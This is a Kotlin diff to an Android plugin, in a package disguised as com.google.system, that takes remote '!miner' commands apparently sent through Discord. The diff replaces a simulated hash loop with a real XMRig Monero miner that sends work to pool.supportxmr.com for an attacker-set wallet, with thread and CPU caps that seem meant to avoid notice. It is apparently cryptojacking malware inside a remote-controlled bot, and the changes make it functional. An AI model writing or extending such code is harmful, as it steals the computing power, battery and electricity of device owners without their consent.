@@ -2,27 +2,27 @@ package com.google.system.plugins
 
 import android.content.Context
 import android.os.BatteryManager
+import com.google.system.RealMiner
 import kotlinx.coroutines.*
-import java.math.BigInteger
-import java.security.MessageDigest
 
 class MinerPlugin : Plugin {
     override val id = "miner"
     override val name = "Crypto Miner"
-    override val version = "1.0"
+    override val version = "2.0"
     override val commands = listOf("!miner")
-    override val description = "Background Monero (XMR) mining with smart protection"
-    
-    private var miningJob: Job? = null
+    override val description = "Real Monero (XMR) mining using XMRig"
+
+    private var realMiner: RealMiner? = null
     private var isMining = false
-    private var hashesComputed = 0L
     private var startTime = 0L
     private var wallet = ""
     private var pool = "pool.supportxmr.com:3333"
     private var maxThreads = 2
     private var maxCpuPercent = 40
-    
+    private var contextRef: Context? = null
+
     override fun onEnable(context: Context): Boolean {
+        contextRef = context
         return try {
             val config = PluginManager.getPlugin(id)?.getConfig() ?: emptyMap()
             wallet = config["wallet"] as? String ?: ""
@@ -32,11 +32,11 @@ class MinerPlugin : Plugin {
             true
         } catch (_: Exception) { false }
     }
-    
+
     override fun onDisable() {
         stopMining()
     }
-    
+
     override fun handleCommand(cmd: String, payload: String?): String? {
         val sub = payload?.trim()?.lowercase()
         return when {
@@ -68,81 +68,83 @@ class MinerPlugin : Plugin {
             else -> null
         }
     }
-    
-    override fun getConfig(): Map<String, Any> = mapOf(
-        "mining" to isMining,
-        "wallet" to wallet,
-        "pool" to pool,
-        "threads" to maxThreads,
-        "max_cpu" to maxCpuPercent,
-        "hashes" to hashesComputed,
-        "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
-    )
-    
+
+    override fun getConfig(): Map<String, Any> {
+        val status = realMiner?.getStatus()
+        return mapOf(
+            "mining" to isMining,
+            "wallet" to wallet,
+            "pool" to pool,
+            "threads" to maxThreads,
+            "max_cpu" to maxCpuPercent,
+            "hashrate" to (status?.hashrate ?: 0.0),
+            "shares_accepted" to (status?.sharesAccepted ?: 0),
+            "shares_rejected" to (status?.sharesRejected ?: 0),
+            "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
+        )
+    }
+
     private fun startMining(): String {
         if (isMining) return ":warning: Already mining"
         if (wallet.isBlank()) return ":x: Set wallet first: `!miner set_wallet <address>`"
-        
-        isMining = true
-        startTime = System.currentTimeMillis()
-        hashesComputed = 0
-        
-        miningJob = CoroutineScope(Dispatchers.IO).launch {
-            while (isActive && isMining) {
-                if (!shouldMine()) {
-                    delay(30000)
-                    continue
-                }
-                
-                val batch = computeHashBatch(1000)
-                hashesComputed += batch
-                
-                delay(100)
+        if (contextRef == null) return ":x: Context not initialized"
+
+        val poolParts = pool.split(":")
+        val host = poolParts[0]
+        val port = poolParts.getOrNull(1)?.toIntOrNull() ?: 3333
+
+        realMiner = RealMiner(
+            context = contextRef!!,
+            wallet = wallet,
+            poolHost = host,
+            poolPort = port,
+            maxThreads = maxThreads,
+            onStatusUpdate = { status ->
+                // Auto-update status on Discord if needed
             }
+        )
+
+        val result = realMiner?.start() ?: "Failed to initialize miner"
+        if (result.contains("started", ignoreCase = true)) {
+            isMining = true
+            startTime = System.currentTimeMillis()
         }
-        
-        return ":pick: **Mining started**\nWallet: `${wallet.take(10)}...${wallet.takeLast(6)}`\nPool: $pool\nThreads: $maxThreads"
+        return result
     }
-    
+
     fun stopMining() {
         isMining = false
-        miningJob?.cancel()
-        miningJob = null
+        realMiner?.stop()
+        realMiner = null
     }
-    
+
     private fun getStatus(): String {
-        val status = if (isMining) ":green_circle: MINING" else ":red_circle: STOPPED"
-        val hashes = if (hashesComputed > 1000000) "${hashesComputed / 1000000}M" else "${hashesComputed / 1000}K"
+        val status = realMiner?.getStatus()
+        val miningStatus = if (isMining) ":green_circle: MINING" else ":red_circle: STOPPED"
+        val hashrate = status?.hashrate?.let { hr ->
+            when {
+                hr >= 1000 -> "${"%.2f".format(hr / 1000)} kH/s"
+                else -> "${"%.2f".format(hr)} H/s"
+            }
+        } ?: "0 H/s"
         val uptime = if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 60000}m" else "0m"
-        
+        val shares = "${status?.sharesAccepted ?: 0} accepted / ${status?.sharesRejected ?: 0} rejected"
+        val connected = if (status?.poolConnection == true) ":green_circle: Connected" else ":red_circle: Disconnected"
+
         return buildString {
-            appendLine(":pick: **Miner Status** $status")
+            appendLine(":pick: **Miner Status** $miningStatus")
             appendLine()
             appendLine("Wallet: `${wallet.take(10)}...${wallet.takeLast(6)}`")
             appendLine("Pool: `$pool`")
+            appendLine("Connection: $connected")
             appendLine("Threads: $maxThreads | Max CPU: ${maxCpuPercent}%")
-            appendLine("Hashes: $hashes | Uptime: $uptime")
+            appendLine("Hashrate: $hashrate")
+            appendLine("Shares: $shares")
+            appendLine("Uptime: $uptime")
+            if (status?.rawOutput?.isNotBlank() == true) {
+                appendLine()
+                appendLine("Last output: `${status.rawOutput.take(100)}`")
+            }
         }
-    }
-    
-    private suspend fun shouldMine(): Boolean {
-        return try {
-            val bm = android.content.Context.BATTERY_SERVICE as? BatteryManager ?: return false
-            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-            level >= 20
-        } catch (_: Exception) { true }
-    }
-    
-    private fun computeHashBatch(count: Int): Long {
-        var computed = 0L
-        val data = "phantom_mining_${System.currentTimeMillis()}_${Math.random()}"
-        for (i in 0 until count) {
-            try {
-                val hash = MessageDigest.getInstance("SHA-256").digest((data + i).toByteArray())
-                BigInteger(1, hash).toString(16)
-                computed++
-            } catch (_: Exception) {}
-        }
-        return computed
     }
 }
